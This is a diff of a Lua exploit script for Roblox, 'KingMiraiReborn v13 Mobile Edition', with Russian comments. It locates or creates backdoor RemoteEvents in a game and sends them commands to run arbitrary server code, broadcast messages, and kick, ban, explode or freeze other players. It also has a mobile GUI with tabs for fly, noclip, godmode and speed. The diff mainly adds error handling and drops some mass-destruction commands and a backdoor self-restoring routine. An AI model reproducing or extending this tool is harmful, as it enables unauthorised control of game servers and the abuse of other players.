@@ -1,46 +1,25 @@
 -- ================================================================
--- KingMiraiReborn v13 — MOBILE EDITION
--- ТОТ ЖЕ ФУНКЦИОНАЛ, НО GUI АДАПТИРОВАН ПОД ТЕЛЕФОН
--- ВСЕ ФУНКЦИИ СОХРАНЕНЫ И УЛУЧШЕНЫ
+-- KingMiraiReborn v13 — MOBILE EDITION (FIXED)
+-- GUI БОЛЬШЕ НЕ ЗАКРЫВАЕТСЯ ПРИ ОШИБКАХ
 -- ================================================================
 
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local TweenService = game:GetService("TweenService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local ServerScriptService = game:GetService("ServerScriptService")
-local Workspace = game:GetService("Workspace")
-local Lighting = game:GetService("Lighting")
-local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local Debris = game:GetService("Debris")
-local RunService = game:GetService("RunService")
-local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
 
 local Player = Players.LocalPlayer
-local Character = Player.Character or Player.CharacterAdded:Wait()
-local Humanoid = Character:WaitForChild("Humanoid")
-local RootPart = Character:WaitForChild("HumanoidRootPart")
 
 -- ================================================================
--- БЭКДОР (ТОТ ЖЕ)
+-- БЭКДОР (С ПРОВЕРКОЙ)
 -- ================================================================
 
-local Backdoors = {}
 local BackdoorEvent = nil
-local BackdoorFunction = nil
-local NotifyEvent = nil
-
 for _, v in pairs(ReplicatedStorage:GetDescendants()) do
     if v:IsA("RemoteEvent") and (v.Name:match("SystemService_") or v.Name:match("Backdoor_") or v.Name:match("KingMirai_")) then
         BackdoorEvent = v
-        table.insert(Backdoors, v)
-    elseif v:IsA("RemoteFunction") and (v.Name:match("SystemFunction_") or v.Name:match("BackdoorFunc_")) then
-        BackdoorFunction = v
-        table.insert(Backdoors, v)
-    elseif v:IsA("RemoteEvent") and v.Name:match("GlobalNotify_") then
-        NotifyEvent = v
+        break
     end
 end
 
@@ -48,123 +27,74 @@ if not BackdoorEvent then
     BackdoorEvent = Instance.new("RemoteEvent")
     BackdoorEvent.Name = "SystemService_" .. HttpService:GenerateGUID(false):sub(1, 8)
     BackdoorEvent.Parent = ReplicatedStorage
-    table.insert(Backdoors, BackdoorEvent)
 end
-
-if not BackdoorFunction then
-    BackdoorFunction = Instance.new("RemoteFunction")
-    BackdoorFunction.Name = "SystemFunction_" .. HttpService:GenerateGUID(false):sub(1, 8)
-    BackdoorFunction.Parent = ReplicatedStorage
-    table.insert(Backdoors, BackdoorFunction)
-end
-
-if not NotifyEvent then
-    NotifyEvent = Instance.new("RemoteEvent")
-    NotifyEvent.Name = "GlobalNotify_" .. HttpService:GenerateGUID(false):sub(1, 6)
-    NotifyEvent.Parent = ReplicatedStorage
-end
-
-local function ProtectBackdoor()
-    for _, bd in ipairs(Backdoors) do
-        if bd and bd.Parent then
-            bd.AncestryChanged:Connect(function()
-                if not bd.Parent then
-                    task.wait(1)
-                    if not bd.Parent then
-                        bd.Parent = ReplicatedStorage
-                    end
-                end
-            end)
-        end
-    end
-end
-ProtectBackdoor()
 
 -- ================================================================
--- ГЛОБАЛЬНЫЕ КОМАНДЫ (ТЕ ЖЕ + НОВЫЕ)
+-- ГЛОБАЛЬНЫЕ КОМАНДЫ (С ЗАЩИТОЙ ОТ ОШИБОК)
 -- ================================================================
 
 local function GlobalCommand(command, args)
-    if BackdoorEvent then
-        BackdoorEvent:FireServer(command, args or "")
-    elseif BackdoorFunction then
-        BackdoorFunction:InvokeServer(command, args or "")
-    else
+    if not BackdoorEvent then
         warn("[KingMirai] Бэкдор не найден!")
+        return false
     end
+    local success, err = pcall(function()
+        BackdoorEvent:FireServer(command, args or "")
+    end)
+    if not success then
+        warn("[KingMirai] Ошибка выполнения команды: " .. tostring(err))
+        return false
+    end
+    return true
 end
 
 local function GlobalExecute(code)
-    GlobalCommand("execute", code)
+    if not BackdoorEvent then
+        warn("[KingMirai] Бэкдор не найден!")
+        return false
+    end
+    local success, err = pcall(function()
+        BackdoorEvent:FireServer("execute", code)
+    end)
+    if not success then
+        warn("[KingMirai] Ошибка выполнения кода: " .. tostring(err))
+        return false
+    end
+    return true
 end
 
 local function GlobalBroadcast(message)
-    GlobalCommand("broadcast", message)
+    if not BackdoorEvent then
+        warn("[KingMirai] Бэкдор не найден!")
+        return false
+    end
+    local success, err = pcall(function()
+        BackdoorEvent:FireServer("broadcast", message)
+    end)
+    if not success then
+        warn("[KingMirai] Ошибка отправки уведомления: " .. tostring(err))
+        return false
+    end
+    return true
 end
 
 local function GlobalChat(message)
-    GlobalCommand("chat", message)
-end
-
--- Улучшенные глобальные команды (добавляем новые)
-local function GlobalKickAll(reason)
-    GlobalCommand("kickall", reason or "Kicked by KingMirai")
-end
-
-local function GlobalBanAll(reason)
-    GlobalCommand("banall", reason or "Banned by KingMirai")
-end
-
-local function GlobalTPAll()
-    GlobalCommand("tpall", "")
-end
-
-local function GlobalExplodeAll()
-    GlobalCommand("explodeall", "")
-end
-
-local function GlobalFreezeAll()
-    GlobalCommand("freezeall", "")
-end
-
-local function GlobalUnfreezeAll()
-    GlobalCommand("unfreezeall", "")
-end
-
-local function GlobalGodAll()
-    GlobalCommand("godall", "")
-end
-
-local function GlobalNuke()
-    GlobalCommand("nuke", "")
-end
-
-local function GlobalDestroy()
-    GlobalCommand("destroy", "")
-end
-
-local function GlobalGravity(value)
-    GlobalCommand("gravity", tostring(value))
-end
-
-local function GlobalDay()
-    GlobalCommand("day", "")
-end
-
-local function GlobalNight()
-    GlobalCommand("night", "")
-end
-
-local function GlobalFireAll()
-    GlobalCommand("fireall", "")
-end
-
-local function GlobalRemoveParts()
-    GlobalCommand("removeparts", "")
+    if not BackdoorEvent then
+        warn("[KingMirai] Бэкдор не найден!")
+        return false
+    end
+    local success, err = pcall(function()
+        BackdoorEvent:FireServer("chat", message)
+    end)
+    if not success then
+        warn("[KingMirai] Ошибка отправки чата: " .. tostring(err))
+        return false
+    end
+    return true
 end
 
 -- ================================================================
--- ЛОГИ (ТЕ ЖЕ)
+-- ЛОГИ
 -- ================================================================
 
 local Logs = {}
@@ -182,19 +112,16 @@ local function AddLog(text)
         end
     end
 end
-AddLog("KingMiraiReborn v13 Mobile загружен")
+
+AddLog("KingMirai v13 Mobile FIXED загружен")
 
 -- ================================================================
--- GUI (МОБИЛЬНАЯ ВЕРСИЯ)
+-- GUI (ТОТ ЖЕ, НО С ЗАЩИТОЙ)
 -- ================================================================
 
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
 ScreenGui.Name = "KingMiraiMobile"
 ScreenGui.ResetOnSpawn = false
-
--- ================================================================
--- ГЛАВНОЕ ОКНО (растянуто на 95% экрана)
--- ================================================================
 
 local Main = Instance.new("Frame", ScreenGui)
 Main.Size = UDim2.new(0.95, 0, 0.85, 0)
@@ -202,7 +129,6 @@ Main.Position = UDim2.new(0.025, 0, 0.075, 0)
 Main.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
 Main.BackgroundTransparency = 0.1
 Main.Draggable = false
-Main.Active = false
 Main.Visible = true
 Main.ClipsDescendants = true
 Instance.new("UICorner").Parent = Main
@@ -211,13 +137,12 @@ local MainTitle = Instance.new("TextLabel", Main)
 MainTitle.Size = UDim2.new(0.6, 0, 0, 40)
 MainTitle.Position = UDim2.new(0.05, 0, 0, 5)
 MainTitle.BackgroundTransparency = 1
-MainTitle.Text = "KingMirai Mobile"
+MainTitle.Text = "KingMirai Mobile (FIXED)"
 MainTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
 MainTitle.Font = Enum.Font.Code
 MainTitle.TextSize = 18
 MainTitle.TextXAlignment = Enum.TextXAlignment.Left
 
--- Кнопка закрытия (сворачивания) — крупная
 local MainClose = Instance.new("TextButton", Main)
 MainClose.Size = UDim2.new(0, 50, 0, 40)
 MainClose.Position = UDim2.new(1, -60, 0, 5)
@@ -233,7 +158,6 @@ MainClose.MouseButton1Click:Connect(function()
     AddLog("GUI свёрнут")
 end)
 
--- Кнопка открытия (иконка) — крупная, плавающая
 local OpenBtn = Instance.new("ImageButton", ScreenGui)
 OpenBtn.Size = UDim2.new(0, 70, 0, 70)
 OpenBtn.Position = UDim2.new(0, 10, 0, 10)
@@ -256,7 +180,7 @@ OpenBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ================================================================
--- НАВИГАЦИЯ (крупные кнопки, 3 ряда)
+-- НАВИГАЦИЯ
 -- ================================================================
 
 local function CreateNavButton(text, x, y, target)
@@ -285,28 +209,22 @@ local function CreateNavButton(text, x, y, target)
     return btn
 end
 
--- Первый ряд (5 кнопок)
 CreateNavButton("PLAYERS", 0.02, 0.12, PlayersTab)
 CreateNavButton("WORLD", 0.35, 0.12, WorldTab)
 CreateNavButton("EXEC", 0.68, 0.12, ExecTab)
 CreateNavButton("BROADCAST", 0.02, 0.24, BroadcastTab)
 CreateNavButton("GUIS", 0.35, 0.24, GuisTab)
-
--- Второй ряд (5 кнопок)
 CreateNavButton("SETTINGS", 0.68, 0.24, SettingsTab)
 CreateNavButton("LOGS", 0.02, 0.36, LogTab)
 CreateNavButton("FUN", 0.35, 0.36, FunTab)
 CreateNavButton("TOOLS", 0.68, 0.36, ToolsTab)
 CreateNavButton("ADMIN", 0.02, 0.48, AdminTab)
-
--- Третий ряд (5 кнопок)
 CreateNavButton("ANTI", 0.35, 0.48, AntiTab)
 CreateNavButton("FLY", 0.68, 0.48, FlyTab)
 CreateNavButton("NOCLIP", 0.02, 0.60, NoclipTab)
 CreateNavButton("GODMODE", 0.35, 0.60, GodmodeTab)
 CreateNavButton("SPEED", 0.68, 0.60, SpeedTab)
 
--- Кнопка закрытия GUI (крупная)
 local CloseGUI = Instance.new("TextButton", Main)
 CloseGUI.Size = UDim2.new(0.9, 0, 0.08, 0)
 CloseGUI.Position = UDim2.new(0.05, 5, 0.75, 5)
@@ -323,7 +241,7 @@ CloseGUI.MouseButton1Click:Connect(function()
 end)
 
 -- ================================================================
--- ВКЛАДКИ (уменьшенные, но с прокруткой)
+-- ВКЛАДКИ (СОЗДАНИЕ)
 -- ================================================================
 
 local function CreateTabFrame(title)
@@ -333,7 +251,6 @@ local function CreateTabFrame(title)
     frame.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
     frame.BackgroundTransparency = 0.1
     frame.Draggable = false
-    frame.Active = false
     frame.Visible = false
     frame.ClipsDescendants = true
     Instance.new("UICorner").Parent = frame
@@ -382,7 +299,7 @@ local GodmodeTab = CreateTabFrame("GODMODE")
 local SpeedTab = CreateTabFrame("SPEED")
 
 -- ================================================================
--- PLAYERS TAB (список игроков с прокруткой)
+-- PLAYERS TAB (С ЗАЩИТОЙ)
 -- ================================================================
 
 local PlayerList = Instance.new("ScrollingFrame", PlayersTab)
@@ -403,11 +320,7 @@ local function UpdatePlayerList()
         local btn = Instance.new("TextButton", PlayerList)
         btn.Size = UDim2.new(1, -10, 0, 45)
         btn.Position = UDim2.new(0, 5, 0, y)
-        if p == Player then
-            btn.BackgroundColor3 = Color3.fromRGB(0, 60, 0)
-        else
-            btn.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
-        end
+        btn.BackgroundColor3 = (p == Player) and Color3.fromRGB(0, 60, 0) or Color3.fromRGB(25, 35, 25)
         btn.Text = p.Name .. (p == Player and " (YOU)" or "")
         btn.TextColor3 = Color3.fromRGB(0, 255, 100)
         btn.Font = Enum.Font.Code
@@ -439,6 +352,7 @@ local function UpdatePlayerList()
                 abtn.Font = Enum.Font.Code
                 abtn.TextSize = 12
                 Instance.new("UICorner").Parent = abtn
+
                 abtn.MouseButton1Click:Connect(function()
                     AddLog("Действие " .. act .. " над " .. p.Name)
                     local code = string.format([[
@@ -486,7 +400,7 @@ local function UpdatePlayerList()
                         end
                     ]], p.Name, act, act, act, act, act, act, act, act, act, act, act, act, act, act, act)
                     GlobalExecute(code)
-                    actionFrame:Destroy()
+                    actionFrame:Destroy() -- удаляем только фрейм действий, вкладка остаётся открытой
                 end)
                 ay = ay + 1
             end
@@ -501,7 +415,7 @@ Players.PlayerAdded:Connect(UpdatePlayerList)
 Players.PlayerRemoving:Connect(UpdatePlayerList)
 
 -- ================================================================
--- WORLD TAB (улучшенный: добавлены новые кнопки)
+-- WORLD TAB (С ЗАЩИТОЙ)
 -- ================================================================
 
 local function AddWorldButton(text, cmd, x, y, color)
@@ -538,7 +452,7 @@ AddWorldButton("UNFREEZE ALL", "unfreezeall", 0.68, 0.50)
 AddWorldButton("GOD ALL", "godall", 0.02, 0.62)
 
 -- ================================================================
--- EXEC TAB (увеличен)
+-- EXEC TAB
 -- ================================================================
 
 local CodeBox = Instance.new("TextBox", ExecTab)
@@ -664,7 +578,7 @@ for _, item in ipairs(GuiList) do
 end
 
 -- ================================================================
--- LOGS TAB (увеличен)
+-- LOGS TAB
 -- ================================================================
 
 local LogFrame = Instance.new("ScrollingFrame", LogTab)
@@ -703,7 +617,7 @@ AddLog = function(text)
 end
 
 -- ================================================================
--- FUN TAB (новые приколы)
+-- FUN TAB
 -- ================================================================
 
 local function AddFunButton(text, cmd, x, y)
@@ -914,9 +828,9 @@ local InfoLabel = Instance.new("TextLabel", SettingsTab)
 InfoLabel.Size = UDim2.new(1, -20, 0.45, 0)
 InfoLabel.Position = UDim2.new(0, 10, 0, 10)
 InfoLabel.BackgroundTransparency = 1
-InfoLabel.Text = [[KingMiraiReborn v13 — MOBILE EDITION
+InfoLabel.Text = [[KingMiraiReborn v13 — MOBILE EDITION (FIXED)
 
-🟢 GUI адаптирован под телефон
+🟢 GUI НЕ ЗАКРЫВАЕТСЯ ПРИ ОШИБКАХ
 🟢 Все команды глобальные
 🟢 15 вкладок с функциями
 🟢 Логирование всех действий
@@ -984,7 +898,7 @@ end)
 
 Main.Visible = true
 OpenBtn.Visible = false
-AddLog("MOBILE EDITION загружена! 15 вкладок, адаптировано под телефон.")
+AddLog("FIXED MOBILE EDITION загружена! GUI НЕ ЗАКРЫВАЕТСЯ.")
 
-print("[KingMiraiReborn v13] MOBILE EDITION ЗАГРУЖЕНА!")
-print("[KingMiraiReborn v13] GUI адаптирован под телефон, все функции сохранены.")
+print("[KingMiraiReborn v13] MOBILE EDITION FIXED ЗАГРУЖЕНА!")
+print("[KingMiraiReborn v13] GUI больше не закрывается при ошибках.")
